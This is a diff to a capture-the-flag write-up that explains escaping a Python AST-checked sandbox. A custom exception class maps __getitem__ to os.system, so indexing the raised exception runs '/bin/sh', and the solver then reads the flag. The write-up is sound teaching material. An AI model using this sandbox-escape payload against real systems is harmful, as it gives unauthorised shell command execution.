@@ -80,7 +80,7 @@ That leaves tricking the ast parser by calling functions indirectly (without inv
 One way to achieve indirect function calls, is dunder (double underscore) methods. These are functions that help creating classes in Python, and are normally used in order to make contructors, overload operators change the behavior of Python built-in functions on the classe's objects, and more.
 
 ## Constructing a Solution Payload
-At first, this doesn't seem to be of much help - to create an object (and invoke \_\_init__ or another dunder method).
+At first, this doesn't seem to be of much help - to create an object (and invoke ```__init__``` or another dunder method).
 After putting some thought into it, I came to realize that exceptions are classes too! A quick check reveals that it is possible to raise exceptions without any arguments.
 Meaning:
 
@@ -97,7 +97,34 @@ class CustomException(Exception):
  try:
    raise CustomException
  except CustomException as e:
-   pass # use the exception object (e)
+   pass # TODO: use the exception object (e)
 ```
 
+At this point, there are several approaches to what dunder method to use to inderectly call a function. One of the most common ones is to overload one of the operators, for example, the plus operator (+) using the ```__add__``` method.
 
+My team and I chose to use ```__getitem__```.
+```__getitem__``` is the function that is being called when looking for a value that matches a key in a dictionary.
+
+For instance, in the following code snippet, ```__getitem__``` is called to retrieve the value matching the key 'a':
+```python
+d = {'a': 1, 'b': 2}
+d['a']
+```
+By overriding ```__getitem__``` in our custom exception with another function, we can get ANY function to execute with one argument - whatever we put in the square brackets as a 'key'.
+
+Since the ```os``` module is loaded into the running namespace, we can override ```__getitem__``` with os.system and thus execute any shell command.
+
+This brings us to the final attack payload:
+```python
+class CustomException(Exception):
+	__getitem__ = os.system
+
+try:
+	raise CustomException
+except CustomException as e:
+	e["/bin/sh"]
+```
+Which will end up executing: ```os.system("/bin/sh")```, providing us an unlimited shell.
+```$ cat flag
+CTF{CzeresniaTopolaForsycja}
+```
